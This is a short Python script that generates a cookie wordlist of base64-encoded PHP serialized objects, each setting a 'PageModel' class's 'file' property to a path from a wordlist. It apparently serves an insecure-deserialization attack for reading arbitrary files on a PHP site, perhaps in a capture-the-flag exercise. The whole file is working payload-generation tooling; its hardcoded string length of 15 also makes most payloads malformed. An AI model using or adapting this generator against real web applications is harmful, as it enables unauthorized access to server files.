import base64
list = []

with open('wordlist.txt') as f:
    list = f.read().splitlines()

def gen_token(dir):
        payload = 'O:9:"PageModel":1:{s:4:"file";s:15:"%s";}' % dir
        payload_bytes = payload.encode('utf-8')
        base64_bytes = base64.b64encode(payload_bytes)
        base64_payload = base64_bytes.decode('utf-8')
        return base64_payload

# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    cookies = open('Cookies_wordlist.txt', 'w')
    for i in list:
        token = gen_token(i)
        cookies.write(token)
        cookies.write("\n")

    cookies.close()







